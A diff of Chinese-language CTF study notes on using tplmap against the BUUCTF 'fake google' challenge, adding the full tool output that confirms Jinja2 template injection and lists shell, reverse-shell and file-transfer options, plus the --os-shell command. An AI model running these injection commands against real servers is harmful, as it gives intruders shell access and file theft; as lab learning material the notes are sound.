@@ -6,13 +6,60 @@ tplmap需要python2的运行环境
 
 语法:(进入到/home/cjy/CTF-tools/tplmap/后)
 
-`./tplmap -u http://036c3e84-70cc-4a38-a626-16b8d5d4271b.node5.buuoj.cn:81/qaq?name=1`
+`./tplmap.py -u http://036c3e84-70cc-4a38-a626-16b8d5d4271b.node5.buuoj.cn:81/qaq?name=1`
 
 #可以查询模板,并且还会提示我们使用什么注入
 
 对于buuctf fake google这题,就可以使用命令:
 
 `./tplmap.py -u http://036c3e84-70cc-4a38-a626-16b8d5d4271b.node5.buuoj.cn:81/qaq?name=1 --engine=Jinja2 --os-shell`拿到shell命令界面,别忘了--engine指定模板
+
+![image-20240510205930193](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240510205930193.png)
+
+
+
+```
+root@kali:~/tplmap# ./tplmap.py -u http://4ed902ae-b677-45c3-a0c1-4c8a88af7f07.node3.buuoj.cn/qaq?name=1
+[+] Tplmap 0.5
+    Automatic Server-Side Template Injection Detection and Exploitation Tool
+
+[+] Testing if GET parameter 'name' is injectable
+[+] Smarty plugin is testing rendering with tag '*'
+[+] Smarty plugin is testing blind injection
+[+] Mako plugin is testing rendering with tag '${*}'
+[+] Mako plugin is testing blind injection
+[+] Python plugin is testing rendering with tag 'str(*)'
+[+] Python plugin is testing blind injection
+[+] Tornado plugin is testing rendering with tag '{{*}}'
+[+] Tornado plugin is testing blind injection
+[+] Jinja2 plugin is testing rendering with tag '{{*}}'
+[+] Jinja2 plugin has confirmed injection with tag '{{*}}'
+[+] Tplmap identified the following injection point:
+
+  GET parameter: name
+  Engine: Jinja2
+  Injection: {{*}}
+  Context: text
+  OS: posix-linux
+  Technique: render
+  Capabilities:
+
+   Shell command execution: ok
+   Bind and reverse shell: ok
+   File write: ok
+   File read: ok
+   Code evaluation: ok, python code
+
+[+] Rerun tplmap providing one of the following options:
+
+    --os-shell				Run shell on the target
+    --os-cmd				Execute shell commands
+    --bind-shell PORT			Connect to a shell bind to a target port
+    --reverse-shell HOST PORT	Send a shell back to the attacker's port
+    --upload LOCAL REMOTE	Upload files to the server
+    --download REMOTE LOCAL	Download remote files
+
+```
 
 
 
